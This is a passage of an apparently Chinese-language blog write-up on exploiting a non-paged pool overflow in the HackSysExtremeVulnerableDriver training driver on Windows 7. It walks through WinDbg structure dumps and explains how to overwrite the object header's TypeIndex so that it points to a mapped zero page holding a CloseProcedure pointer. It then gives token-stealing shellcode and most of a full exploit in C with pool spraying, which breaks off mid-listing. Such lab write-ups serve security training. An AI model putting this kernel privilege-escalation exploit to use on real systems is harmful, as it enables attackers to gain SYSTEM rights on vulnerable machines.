(Allocated)  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>81d00 size:  <span class="number">200</span> previous size:   <span class="number">40</span>  (Free)       Even</span><br><span class="line"> <span class="number">85b</span>81f00 size:   <span class="number">40</span> previous size:  <span class="number">200</span>  (Allocated)  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>81f40 size:   c0 previous size:   <span class="number">40</span>  (Free)       Even</span><br></pre></td></tr></table></figure>

<p>可以看到我们构建的event块刚好在函数申请的池空间下边，进而达到溢出利用条件</p>
<h3 id="池头伪造"><a href="#池头伪造" class="headerlink" title="池头伪造"></a>池头伪造</h3><p>Win7池块的结构图：</p>
<p><img src="/2023/08/12/2023-8-HEVD/837014_BN9SCDD2HDWUT7Y.png" alt="图片描述"></p>
<p>查看每种结构：</p>
<p>只有<code>OBJECT_HEADER_QUOTA_INFO</code>的+0x4偏移处存在<code>NonPagedPoolCharge</code>成员指定pool的大小，所以<code>POOL_HEADER</code>后面是<code>OBJECT_HEADER_QUOTA_INFO</code>结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_POOL_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : Pos <span class="number">0</span>, <span class="number">9</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : Pos <span class="number">9</span>, <span class="number">7</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : Pos <span class="number">0</span>, <span class="number">9</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : Pos <span class="number">9</span>, <span class="number">7</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x006</span> PoolTagHash      : Uint2B</span><br><span class="line">kd&gt; dt _OBJECT_HEADER_PROCESS_INFO</span><br><span class="line">nt!_OBJECT_HEADER_PROCESS_INFO</span><br><span class="line">   +<span class="number">0x000</span> ExclusiveProcess : Ptr32 _EPROCESS</span><br><span class="line">   +<span class="number">0x004</span> Reserved         : Uint4B</span><br><span class="line">kd&gt; dt _OBJECT_HEADER_QUOTA_INFO</span><br><span class="line">nt!_OBJECT_HEADER_QUOTA_INFO</span><br><span class="line">   +<span class="number">0x000</span> PagedPoolCharge  : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> NonPagedPoolCharge : Uint4B<span class="comment">////这里</span></span><br><span class="line">   +<span class="number">0x008</span> SecurityDescriptorCharge : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> SecurityDescriptorQuotaBlock : Ptr32 Void</span><br><span class="line">kd&gt; dt _OBJECT_HEADER_HANDLE_INFO</span><br><span class="line">nt!_OBJECT_HEADER_HANDLE_INFO</span><br><span class="line">   +<span class="number">0x000</span> HandleCountDataBase : Ptr32 _OBJECT_HANDLE_COUNT_DATABASE</span><br><span class="line">   +<span class="number">0x000</span> SingleEntry      : _OBJECT_HANDLE_COUNT_ENTRY</span><br><span class="line">kd&gt; dt _OBJECT_HEADER_NAME_INFO</span><br><span class="line">nt!_OBJECT_HEADER_NAME_INFO</span><br><span class="line">   +<span class="number">0x000</span> Directory        : Ptr32 _OBJECT_DIRECTORY</span><br><span class="line">   +<span class="number">0x004</span> Name             : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x00c</span> ReferenceCount   : Int4B</span><br><span class="line">kd&gt; dt _OBJECT_HEADER_CREATOR_INFO</span><br><span class="line">nt!_OBJECT_HEADER_CREATOR_INFO</span><br><span class="line">   +<span class="number">0x000</span> TypeList         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x008</span> CreatorUniqueProcess : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> CreatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x00e</span> Reserved         : Uint2B</span><br></pre></td></tr></table></figure>

<p>只有<code>OBJECT_HEADER_QUOTA_INFO</code>的+0x4偏移处存在<code>NonPagedPoolCharge</code>成员指定pool的大小，所以<code>POOL_HEADER</code>后面是<code>OBJECT_HEADER_QUOTA_INFO</code>结构。</p>
<p>查看下一个池块的数据对应结构：</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814042659161.png" alt="image-20230814042659161"></p>
<p>查看每个结构具体成员的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _POOL_HEADER <span class="number">85b</span>81a80 </span><br><span class="line">nt!_POOL_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : <span class="number">0</span>y001000000 (<span class="number">0x40</span>)</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : <span class="number">0</span>y0000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : <span class="number">0</span>y000001000 (<span class="number">0x8</span>)</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : <span class="number">0</span>y0000010 (<span class="number">0x2</span>)</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : <span class="number">0x4080040</span></span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : <span class="number">0xee657645</span></span><br><span class="line">   +<span class="number">0x004</span> AllocatorBackTraceIndex : <span class="number">0x7645</span></span><br><span class="line">   +<span class="number">0x006</span> PoolTagHash      : <span class="number">0xee65</span></span><br><span class="line">kd&gt; dt _OBJECT_HEADER_QUOTA_INFO <span class="number">85b</span>81a80+<span class="number">0x8</span></span><br><span class="line">nt!_OBJECT_HEADER_QUOTA_INFO</span><br><span class="line">   +<span class="number">0x000</span> PagedPoolCharge  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x004</span> NonPagedPoolCharge : <span class="number">0x40</span></span><br><span class="line">   +<span class="number">0x008</span> SecurityDescriptorCharge : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> SecurityDescriptorQuotaBlock : (null) </span><br><span class="line">kd&gt; dt _OBJECT_HEADER <span class="number">85b</span>81a80+<span class="number">0x18</span></span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PointerCount     : <span class="number">0</span>n1</span><br><span class="line">   +<span class="number">0x004</span> HandleCount      : <span class="number">0</span>n1</span><br><span class="line">   +<span class="number">0x004</span> NextToFree       : <span class="number">0x00000001</span> Void</span><br><span class="line">   +<span class="number">0x008</span> Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x00c</span> TypeIndex        : <span class="number">0xc</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x00d TraceFlags       : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x00e</span> InfoMask         : <span class="number">0x8</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x00f Flags            : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x010</span> ObjectCreateInfo : <span class="number">0x8726b940</span> _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +<span class="number">0x010</span> QuotaBlockCharged : <span class="number">0x8726b940</span> Void</span><br><span class="line">   +<span class="number">0x014</span> SecurityDescriptor : (null) </span><br><span class="line">   +<span class="number">0x018</span> Body             : _QUAD</span><br></pre></td></tr></table></figure>

<p>Win7之后，<code>OBJECT_HEADER</code>的<code>TypeIndex</code>成员的值是一个索引值，由<code>ObGetObjectType</code>函数根据索引值在<code>ObTypeIndexTable</code>数组中找到对应的值，该值是<code>OBJECT_TYPE</code>结构的起始地址：</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814043316290.png" alt="image-20230814043316290"></p>
<p>点击TypeInfo成员，查看此处的结构数据，TypeInfo是一个<code>OBJECT_TYPE_INITIALIZER</code>结构体，我们关注其中的<code>CloseProcedure</code>字段，在池块释放时会调用这里的代码，所以我们将此字段覆盖为shellcode的地址即可：</p>
<p>所以我们可以通过溢出控制池块<code>_OBJECT_HEADER</code>来控制<code>TypeIndex</code>指向的地址（这里我们指向0页），然后再再零页+0x60上写入我们的shellcode地址进而达成利用。</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814043454447.png" alt="image-20230814043454447"></p>
<h3 id="将shellcode写入0页内存"><a href="#将shellcode写入0页内存" class="headerlink" title="将shellcode写入0页内存"></a>将shellcode写入0页内存</h3><p>win7中，我们可以在用户模式下控制0页内存，所以我们将<code>OBJECT_HEADER</code>的TypeIndex索引从<code>0xc</code>修改为<code>0x0</code>：</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814043641013.png" alt="image-20230814043641013"></p>
<p>构造池块数据时，由于只需修改<code>TypeIndex</code>，它相对于池块起始位置的偏移是0x8+0x10+0xc=0x24，大小为4，所以溢出数据长度为0x28：</p>
<p>下面是参照正常池块结构来写入的数据，只修改了<code>0x00c</code>的<code>TypeIndex</code>为<code>0x0</code>来指向零页<br>在<code>TriggerBufferOverflowNonPagedPool</code>内部执行完<code>memcpy()</code>后即被溢出重写<code>TypeIndex</code>为<code>0x0</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//********构造池块**********</span></span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x00</span>) = <span class="number">0x04080040</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x04</span>) = <span class="number">0xee657645</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x08</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x0c</span>) = <span class="number">0x00000040</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x10</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x14</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x18</span>) = <span class="number">0x00000001</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x1c</span>) = <span class="number">0x00000001</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x20</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">*(DWORD *)(buf + PoolSize + <span class="number">0x24</span>) = <span class="number">0x00080000</span>; <span class="comment">// 这个只是将TypeIndex字段0x0c设置为0x00，这是我们溢出构造的池块</span></span><br><span class="line"><span class="comment">//********构造池块**********</span></span><br></pre></td></tr></table></figure>

<h4 id="配置溢出值"><a href="#配置溢出值" class="headerlink" title="配置溢出值"></a>配置溢出值</h4><p>由于我们的目的只是将<code>TypeIndex</code>修改即可，所以溢出值只要到达<code>TypeIndex</code>的偏移即可，而<code>TypeIndex</code>的成员偏移为<code>0x24</code>，所以我们只要溢出<code>0x24</code>大小即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> ModifySize = <span class="number">0x28</span>; <span class="comment">// 由于我们只要将TypeIndex修改即可，所以溢出值只要到达TypeIndex的偏移即可</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> PoolSize = <span class="number">0x1f8</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x220</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0x41</span>, <span class="number">0x1f8</span>);</span><br></pre></td></tr></table></figure>

<p>申请零页内存空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PVOID Zero_addr = (PVOID)<span class="number">1</span>;</span><br><span class="line">SIZE_T RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">*(FARPROC *)&amp;NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(<span class="string">L&quot;ntdll&quot;</span>),<span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NtAllocateVirtualMemory == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get function NtAllocateVirtualMemory!!!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Started to alloc zero page...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(NtAllocateVirtualMemory( <span class="comment">// 通过NtAllocateVirtualMemory来申请0页内存空间</span></span><br><span class="line">        INVALID_HANDLE_VALUE,</span><br><span class="line">        &amp;Zero_addr,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;RegionSize,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_READWRITE)) ||</span><br><span class="line">    Zero_addr != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to alloc zero page!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将0页<code>+0x60</code>的成员<code>CloseProcedure</code>指向我们的<code>shellcode</code>地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(DWORD *)(<span class="number">0x60</span>) = (DWORD)&amp;ShellCode; <span class="comment">// 将0页+0x60偏移成员CloseProcedure设置为我们shellcode地址</span></span><br></pre></td></tr></table></figure>



<p>完整exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span></span><br><span class="line"><span class="params">(WINAPI* My_NtAllocateVirtualMemory)</span><span class="params">(</span></span><br><span class="line"><span class="params">	IN HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	IN OUT PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	IN ULONG ZeroBits,</span></span><br><span class="line"><span class="params">	IN OUT PULONG RegionSize,</span></span><br><span class="line"><span class="params">	IN ULONG AllocationType,</span></span><br><span class="line"><span class="params">	IN ULONG Protect</span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"></span><br><span class="line">My_NtAllocateVirtualMemory NtAllocateVirtualMemory = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">ShellCode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">		pop edi; 这里注意堆栈平衡</span><br><span class="line">		pop esi; 这里注意堆栈平衡</span><br><span class="line">		pop ebx; 这里注意堆栈平衡</span><br><span class="line">		pushad</span><br><span class="line">		xor eax, eax; eax设置为<span class="number">0</span></span><br><span class="line">		mov eax, fs: [eax + <span class="number">124</span>h]; 获取 nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">		mov eax, [eax + <span class="number">050</span>h]; 获取 nt!_KTHREAD.ApcState.Process</span><br><span class="line">		mov ecx, eax; 将本进程EPROCESS地址复制到ecx</span><br><span class="line">		mov edx, <span class="number">4</span>; WIN <span class="number">7</span> SP1 SYSTEM process PID = <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">		SearchSystemPID:</span><br><span class="line">		mov eax, [eax + <span class="number">0b</span>8h]; 获取 nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">			sub eax, <span class="number">0b</span>8h</span><br><span class="line">			cmp[eax + <span class="number">0b</span>4h], edx; 获取 nt!_EPROCESS.UniqueProcessId</span><br><span class="line">			jne SearchSystemPID; 循环检测是否是SYSTEM进程PID</span><br><span class="line"></span><br><span class="line">			mov edx, [eax + <span class="number">0f</span>8h]; 获取System进程的Token</span><br><span class="line">			mov[ecx + <span class="number">0f</span>8h], edx; 将本进程Token替换为SYSTEM进程 nt!_EPROCESS.Token</span><br><span class="line">			; End of Token Stealing Stub</span><br><span class="line">			popad</span><br><span class="line">			ret; Return cleanly</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Get HANDLE</span></span><br><span class="line">	hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Start to get HANDLE...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Success to get HANDLE!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE Event_OBJECT[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">Pool_Spray</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">		Event_OBJECT[i] = CreateEventA(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 0x40 * 8 = 0x200</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">			CloseHandle(Event_OBJECT[i + j]);    <span class="comment">//每次[0-7]*n的event空间，而8*n不释放，进而构成0x40 * 8 = 0x200的空闲空间</span></span><br><span class="line">		i += <span class="number">8</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOW;</span><br><span class="line">	WCHAR wzFilePath[MAX_PATH] = &#123; <span class="string">L&quot;cmd.exe&quot;</span> &#125;;</span><br><span class="line">	BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp; si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">shellcode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// PoolSize + ModifySize = 0x1f8 + 0x28</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> ModifySize = <span class="number">0x28</span>;    <span class="comment">//由于我们只要将TypeIndex修改即可，所以溢出值只要到达TypeIndex的偏移即可</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> PoolSize = <span class="number">0x1f8</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x220</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0x41</span>, <span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Started to construct pool...\n&quot;</span>);</span><br><span class="line">	<span class="comment">//********构造池块**********</span></span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x00</span>) = <span class="number">0x04080040</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x04</span>) = <span class="number">0xee657645</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x08</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x0c</span>) = <span class="number">0x00000040</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x10</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x14</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x18</span>) = <span class="number">0x00000001</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x1c</span>) = <span class="number">0x00000001</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x20</span>) = <span class="number">0x00000000</span>;</span><br><span class="line">	*(DWORD*)(buf + PoolSize + <span class="number">0x24</span>) = <span class="number">0x00080000</span>; <span class="comment">// 这个只是将TypeIndex字段设置为0x0，这是我们溢出构造的池块</span></span><br><span class="line">	<span class="comment">//********构造池块**********</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Success to construct pool!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	PVOID    Zero_addr = (PVOID)<span class="number">1</span>;</span><br><span class="line">	SIZE_T    RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">	*(FARPROC*)&amp; NtAllocateVirtualMemory = GetProcAddress(</span><br><span class="line">		GetModuleHandleW(<span class="string">L&quot;ntdll&quot;</span>),</span><br><span class="line">		<span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (NtAllocateVirtualMemory == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get function NtAllocateVirtualMemory!!!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span 